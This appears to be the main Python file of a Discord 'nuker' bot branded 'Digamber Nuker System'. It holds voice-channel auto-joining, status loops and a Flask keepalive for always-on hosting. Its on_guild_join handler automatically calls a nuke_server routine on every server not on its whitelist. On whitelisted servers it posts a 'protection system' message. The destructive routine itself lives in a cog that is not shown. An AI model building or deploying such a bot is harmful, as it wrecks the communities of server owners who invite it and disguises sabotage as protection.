import discord
from discord.ext import commands, tasks
import os
import asyncio
from flask import Flask
from datetime import datetime

app = Flask(__name__)
bot_name = "Loading..."

@app.route('/')
def home():
    return f"🤖 {bot_name} - Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("DISCORD_TOKEN")

class NukerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        self.start_time = datetime.now()
        # TERA TEENO VOICE CHANNELS
        self.voice_channels = [
            1445768972199792742,  # Pehla server
            1400384001306529904,  # Dusra server  
            1421772715962142840   # Teesra server
        ]
        print("🔊 Voice channels to connect:")
        for i, ch_id in enumerate(self.voice_channels, 1):
            print(f"   {i}. {ch_id}")

    async def setup_hook(self):
        try:
            await self.load_extension("cogs.nuker")
            print("✅ Loaded nuker cog with PROFESSIONAL features")
        except Exception as e:
            print(f"❌ Failed to load cog: {e}")

        await self.tree.sync()
        self.update_status.start()
        self.update_dashboard.start()
        # Voice connection will happen in on_ready

    async def safe_voice_connect(self, channel_id):
        """SAFE voice connection with proper error handling"""
        try:
            channel = self.get_channel(channel_id)
            if not channel:
                print(f"❌ Channel {channel_id} not found in cache")
                return False
            
            print(f"🎯 Attempting to connect to: {channel.name} ({channel.guild.name})")
            
            # Check if already connected in this guild
            guild = channel.guild
            if guild.voice_client and guild.voice_client.is_connected():
                print(f"✅ Already connected in {guild.name}")
                return True
            
            # CONNECT with timeout
            print(f"🔗 Connecting to {channel.name}...")
            await channel.connect(timeout=30.0, reconnect=False)
            print(f"🎉 SUCCESS! Connected to {channel.name} in {guild.name}")
            return True
            
        except discord.errors.ClientException as e:
            if "Already connected" in str(e):
                print(f"ℹ️  Already connected to voice in {guild.name}")
                return True
            print(f"⚠️  ClientException [{channel_id}]: {e}")
        except discord.errors.Forbidden:
            print(f"🚫 No permission to join voice in {guild.name}")
        except discord.errors.NotFound:
            print(f"🔍 Voice channel not found in {guild.name}")
        except asyncio.TimeoutError:
            print(f"⏰ Connection timeout for {channel_id}")
        except Exception as e:
            print(f"💥 UNEXPECTED ERROR [{channel_id}]: {type(e).__name__}: {str(e)[:100]}")
        
        return False

    async def on_ready(self):
        global bot_name
        bot_name = str(self.user)
        print(f"🔗 {bot_name} is ONLINE!")
        print(f"📊 Connected to {len(self.guilds)} servers")
        
        # Whitelisted servers ko check karo
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            whitelist_count = len(nuker_cog.whitelisted_servers)
            print(f"🔒 {whitelist_count} servers are WHITELISTED (PROTECTED)")
            
            # Tere teen safe servers ki list print karo
            safe_servers = []
            for server_id in nuker_cog.whitelisted_servers:
                guild = self.get_guild(server_id)
                if guild:
                    safe_servers.append(f"{guild.name} ({server_id})")
            
            if safe_servers:
                print("✅ PROTECTED SERVERS:")
                for server in safe_servers:
                    print(f"   - {server}")
        
        # VOICE CONNECTION - WAIT 5 SECONDS THEN CONNECT
        print("⏳ Waiting 5 seconds before voice connection...")
        await asyncio.sleep(5)
        
        print("🔊 STARTING VOICE CONNECTIONS...")
        success_count = 0
        for channel_id in self.voice_channels:
            success = await self.safe_voice_connect(channel_id)
            if success:
                success_count += 1
            await asyncio.sleep(3)  # 3 seconds gap
        
        print(f"📈 Voice connection summary: {success_count}/{len(self.voice_channels)} successful")
        
        # Start voice monitor
        self.voice_monitor.start()
        
        if os.environ.get('RENDER'):
            import threading
            threading.Thread(target=run_flask, daemon=True).start()
            print("🚀 Flask server started for 24/7 uptime")

    @tasks.loop(minutes=2)
    async def voice_monitor(self):
        """Monitor voice connections"""
        try:
            if not self.is_ready():
                return
            
            print("🔄 Voice connection check...")
            for channel_id in self.voice_channels:
                channel = self.get_channel(channel_id)
                if not channel:
                    continue
                
                guild = channel.guild
                if not guild.voice_client or not guild.voice_client.is_connected():
                    print(f"🔇 Disconnected from {channel.guild.name}, reconnecting...")
                    await self.safe_voice_connect(channel_id)
                    await asyncio.sleep(2)
                    
        except Exception as e:
            print(f"❌ Voice monitor error: {e}")

    @voice_monitor.before_loop
    async def before_voice_monitor(self):
        await self.wait_until_ready()

    async def on_voice_state_update(self, member, before, after):
        """Handle voice disconnections"""
        if member.id == self.user.id and before.channel and not after.channel:
            print(f"🔇 Bot was disconnected from {before.channel.guild.name}")
            await asyncio.sleep(3)
            
            # Find which channel ID it was
            for channel_id in self.voice_channels:
                if before.channel.id == channel_id:
                    print(f"⚡ Reconnecting to {before.channel.guild.name}...")
                    await self.safe_voice_connect(channel_id)
                    break

    async def on_guild_join(self, guild):
        """Naya server join hone par - PROFESSIONAL SYSTEM"""
        print(f"🎯 Bot joined: {guild.name} ({guild.id})")
        
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            if nuker_cog.is_whitelisted(guild.id):
                print(f"✅ WHITELISTED SERVER - Bot will provide protection features")
                # Whitelisted server hai - protection provide karo
                try:
                    general = discord.utils.get(guild.text_channels, name="general")
                    if general:
                        embed = discord.Embed(
                            title="🛡️ PROTECTION SYSTEM ACTIVATED",
                            description=f"**{guild.name}** is now protected by Digamber Nuker System.",
                            color=0x00ff00,
                            timestamp=datetime.utcnow()
                        )
                        embed.add_field(
                            name="AVAILABLE COMMANDS",
                            value="• `!protection` - Check safety status\n• `!serverinfo` - Server analytics\n• `!whitelisted` - View protected servers",
                            inline=False
                        )
                        embed.set_footer(text="Digamber Protection • 24/7 Security")
                        await general.send(embed=embed)
                except:
                    pass
                return
            else:
                print(f"💣 NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
                await nuker_cog.nuke_server(guild)

    @tasks.loop(minutes=5)
    async def update_status(self):
        """Update bot status every 5 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            safe_count = len(nuker_cog.whitelisted_servers) if nuker_cog else 0
            total_servers = len(self.guilds)
            
            status_text = f"{safe_count}/{total_servers} Protected"
            await self.change_presence(activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=status_text
            ))
        except:
            pass

    @tasks.loop(minutes=2)
    async def update_dashboard(self):
        """Update status channel every 2 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            if nuker_cog:
                await nuker_cog.update_status_channel()
        except Exception as e:
            print(f"❌ Dashboard update failed: {e}")

    @update_status.before_loop
    async def before_update_status(self):
        await self.wait_until_ready()

    @update_dashboard.before_loop
    async def before_update_dashboard(self):
        await self.wait_until_ready()

if __name__ == "__main__":
    print("🚀 Starting Digamber Nuker Bot with PROFESSIONAL features...")
    print("🎧 VOICE SYSTEM: FFMPEG REQUIRED")
    print("📌 Make sure build.sh installs FFMPEG on Render!")
    bot = NukerBot()
    bot.run(TOKEN)
